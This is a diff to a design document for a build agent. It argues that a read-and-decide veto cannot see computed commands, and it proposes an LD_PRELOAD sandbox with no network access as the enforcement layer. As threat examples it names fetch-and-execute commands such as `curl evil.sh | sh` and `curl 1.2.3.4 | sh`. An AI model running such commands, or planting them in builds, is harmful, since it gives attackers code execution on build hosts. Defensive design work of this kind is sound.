@@ -5,7 +5,9 @@ the rest is design). Companion to
 [`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
 (the sovereign-agent + policy-class design). This doc is specifically about
 *how* a remote `aeb-agent` decides, on its own authority, whether to build a
-prepared tree — `maybe_veto_build`.
+prepared tree — `maybe_veto_build` — and, since the veto is only the *policy*
+layer, how Aether's runtime sandbox **contains** the build it lets through
+(the section "Veto is policy; containment is enforcement").
 
 (Disambiguation: the policy-class doc also says "veto", but that's the
 *token/claim* veto — refusing an unauthenticated or over-scoped dispatch at
@@ -41,6 +43,149 @@ Conflating the two is how a veto framework manufactures false confidence.
 A green `maybe_veto_build` means *the build process was acceptable to the
 agent operator* — it says nothing about whether the software is safe to
 run. Keep that line bright.
+
+## Veto is policy; containment is enforcement — they are different layers
+
+Before the tiers: be clear about what the veto *is*. `maybe_veto_build` is a
+**policy gate** — it inspects (the tree, the resolved closure, a recorded
+trace) and *decides* whether to proceed. Every tier in this doc is a thing
+the agent *reads and reasons about* before letting the build run.
+
+That makes the veto fundamentally **bounded by what it can read.** Tier C's
+honest-limits section already says it: a `.build.ae` doing
+`os.system(decode(blob))` records `os.system(<computed string>)` — the veto
+can flag opacity as policy, but it *cannot read what would actually run.* A
+build that *computes* `curl evil.sh | sh` at runtime is invisible to every
+tier here. That is not a gap to be closed by a smarter veto; it is the
+nature of a read-and-decide gate.
+
+The thing that *does* close it is **containment** — enforcing limits on the
+running build at a layer it cannot reason its way around. aeb's leased agent
+has **three containment surfaces**, stacked as defense in depth, each
+catching what the layer above is blind to:
+
+| Layer | Mechanism | Catches | Blind to |
+|---|---|---|---|
+| **Veto** (policy; in-process, pre-build) | `maybe_veto_build` tiers A/B/C | *Declared / readable* build-grammar escapes | Computed/opaque escapes; the compiled artifact |
+| **Aether sandbox** (per-process; `LD_PRELOAD`) | `spawn_sandboxed(grants, "aeb", target)` | *Runtime* fs/exec/tcp/env attempts by the build **and its children** — including computed ones the veto couldn't read | A statically-linked tool that bypasses libc; the artifact's later behaviour |
+| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | Everything that escapes the preload — kernel-level blast radius | (this is the floor) |
+
+The middle layer is the one this section exists to capture, because it is
+**already implemented upstream in Aether and aeb has not yet consumed it**
+(LLM.md's scope table lists "Sandboxing / isolation" as a TODO — "Aether's
+runtime sandbox is per-process, not per-build-step." The finding below is
+that per-process is *enough*, because the build's children inherit it).
+
+### The Aether sandbox primitive — `spawn_sandboxed` + the grandchild finding
+
+Aether ships a runtime containment sandbox (`runtime/aether_sandbox.c`,
+`runtime/aether_spawn_sandboxed.c`, `runtime/libaether_sandbox_preload.c`;
+demos in the Aether tree at `examples/sandbox-demo.ae` /
+`examples/sandbox-spawn.ae`). Two shapes:
+
+- **In-process** — `run_sandboxed(perms) |ctx| { ... }` installs a permission
+  checker for the current process; stdlib `fs`/`os`/`net` calls consult it
+  transparently (the contained code uses *normal* stdlib and "should not know
+  for sure it is contained" — a denied read is indistinguishable from
+  file-not-found).
+- **Cross-process** — `spawn_sandboxed(grants, program, arg) -> exit_code`
+  forks, serialises the grant list into POSIX shared memory, sets
+  `LD_PRELOAD=libaether_sandbox.so` + `AETHER_SANDBOX_SHM=<name>` in the
+  child's env, and `execlp`s. The preload intercepts libc `open` / `fopen` /
+  `connect` / `execve` / `getenv` (and `mmap`/`mprotect`/`dlopen`) and checks
+  each against the grants before calling through.
+
+Grants are `(category, pattern)` pairs with glob/prefix matching:
+`fs_read`, `fs_write`, `exec`, `tcp`, `tcp_listen`, `env` (and `*`/`*` for
+grant-all). E.g. `grant_fs_read("/etc/*")`, `grant_fs_write("/tmp/worker/*")`,
+`grant_exec("echo *")`, `grant_tcp("api.example.com")`.
+
+**The finding that makes this useful for the agent:** because
+`spawn_sandboxed` sets `LD_PRELOAD` and `AETHER_SANDBOX_SHM` as **environment
+variables** in the child before `execlp`, and the `execve` interceptor
+re-checks every subsequent exec against the same shared-memory grants, the
+sandbox **propagates to the entire process subtree.** If the agent spawns
+`aeb` sandboxed, then `aeb → gcc → cc1`, `aeb → javac`, etc. all run under
+the *same* grant list, each `connect()`/`open()`/`execve()` checked. So
+"per-process, not per-build-step" understates it: **one `spawn_sandboxed` of
+`aeb <target>` contains the whole build subtree.** That is precisely the
+per-build-step isolation the roadmap wanted, available today.
+
+This is also why the sandbox covers the veto's blind spot. A build that
+*computes* `curl 1.2.3.4 | sh` defeats tier C's trace (the command is opaque)
+— but the `connect(1.2.3.4)` is a real syscall, and the preload's `connect`
+interceptor denies it regardless of how the command string was built. **Policy
+can be fooled by opacity; the LD_PRELOAD interceptor sees the actual
+syscall.** The veto and the sandbox are not redundant — the sandbox is what
+makes "a clean veto is not a clean program" survivable.
+
+### How the agent would wire it (design — not implemented)
+
+In `tools/aeb-agent.ae`, the accepted-build path today is:
+
+```
+cmd = "cd '${workdir}' && aeb '${target}'"
+rc = os.system(cmd)
+```
+
+The sandboxed shape replaces the `os.system` with a `spawn_sandboxed` whose
+grant list is **the agent operator's policy** (the same authority that owns
+the veto rules — see the policy-class doc), derived from flags/config:
+
+```
+grants = sandbox("preint-build") {
+    grant_fs_read(repo)             // read the prepared tree
+    grant_fs_read("/usr/*")         // toolchain + libs
+    grant_fs_read("/lib/*")
+    grant_fs_write(target_dir)      // write only build outputs
+    grant_fs_write("/tmp/*")        // compilers stage here
+    grant_exec("/usr/bin/*")        // the compiler allowlist (see constraints)
+    // NO grant_tcp — see "network stance" below
+}
+rc = spawn_sandboxed(grants, "aeb", target)
+```
+
+### Constraints — state them or the layer will be over-trusted
+
+1. **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`; on
+   non-Linux it returns `-1` with a clear message. The agent container is
+   Debian, so this is fine *there* — but a macOS/BSD agent host gets no
+   cross-process sandbox and must fall back to the container/VM layer.
+2. **`exec` grants are by resolved path.** The interceptor checks the
+   `execve` pathname against `exec` grants (prefix/glob). So the grant list
+   must enumerate the toolchain — `grant_exec("/usr/bin/*")` or a tighter
+   per-compiler allowlist. **Enumerating the toolchain correctly is the
+   work**; too broad and it's no fence, too narrow and legitimate builds
+   break. This enumeration *is* the policy.
+3. **libc-level, not kernel-level.** A statically-linked binary, or one that
+   issues raw syscalls bypassing libc, is **not** caught by the preload —
+   that is what the container/namespace layer (below it) is for. The sandbox
+   raises the cost of an escape; it is not a kernel jail.
+4. **Not a substitute for the container.** It is the *middle* layer. A build
+   the preload contains can still exhaust memory, fork-bomb, or fill the
+   disk — `pids`/`memory`/`cpu` cgroup limits and a read-only rootfs live at
+   the container layer, which is a separate hardening pass.
+
+### Network stance for a leased `preint` build
+
+**Default: no `tcp` grant at all.** A `preint` build leased to the agent
+should get *zero network*. The common case justifies it: the agent owns the
+origin and fetches the base tree itself (`_prepare_tree`'s
+`git fetch origin` + `git checkout`), so the sources are already on disk
+before the build runs; a compile-only build needs no socket. With no `tcp`
+grant, the preload denies *every* `connect()` — which is exactly what closes
+the computed-`curl|sh` hole at the syscall, no matter how the command was
+constructed.
+
+A build that *legitimately* needs the network (resolving Maven/npm/cargo
+coordinates at build time rather than from a pre-populated cache, or reaching
+an internal artifact mirror) is then the **explicit exception**: the operator
+adds a `grant_tcp(<host-or-ip>)` allowlist for that dispatch. The allowlist
+is itself attack surface, so the strong stance keeps it empty by default and
+makes every entry a deliberate operator decision. (If/when this is tied to
+the dispatch's policy class — `preint`=no-net, `ci`=allowlist — that is the
+plumbing described in the policy-class doc; not designed here beyond the
+default.)
 
 ## The veto pipeline: three complementary tiers
 
@@ -176,3 +321,10 @@ Action!/designer "interpret into a doppelganger via `--lib`" trick (cheap
 in aeb because `--lib` swaps the library with no impedance) — but it guards
 **build-grammar escapes, never the application being built.** A clean veto
 is not a clean program. Keep that boundary bright.
+
+And remember the veto is only the *policy* layer: it decides on what it can
+read. The thing that survives a build it *can't* read — a computed escape, an
+opaque command — is **containment**, and Aether's `spawn_sandboxed` is the
+already-shipped middle layer that contains the whole `aeb <target>` subtree
+at the libc boundary, with the container/namespace layer below it. Veto +
+sandbox + container, stacked — not the veto alone.
